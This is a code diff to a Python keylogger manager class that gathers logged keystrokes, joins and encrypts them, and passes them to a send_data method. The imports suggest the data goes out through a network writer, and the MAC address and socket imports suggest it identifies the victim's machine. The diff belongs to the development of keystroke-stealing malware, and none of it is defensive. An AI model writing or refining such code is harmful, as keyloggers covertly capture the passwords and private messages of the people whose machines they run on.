@@ -1,9 +1,7 @@
 import time
-
 from keyLoggerService import *
 from fileWriter import *
 from networkWriter import *
-from buffer import *
 from encryptor import *
 from getmac import get_mac_address
 import socket
@@ -30,13 +28,12 @@ class KeyLoggerManager:
             if len(self.__service.get_logged_keys()) == 0:
                 continue
             else:
-                self.send_data(self.process_data("".join(self.__service.get_logged_keys())))
+                self.send_data(self.process_data(self.__service.get_logged_keys()))
                 self.__service.flush()
 
 
-
     def process_data(self, data: List[str]) -> str:
-        data_str = " ".join(data)
+        data_str = "".join(data)
         encrypted_data1 = Encryptor().encrypt(data_str)
         return encrypted_data1
 
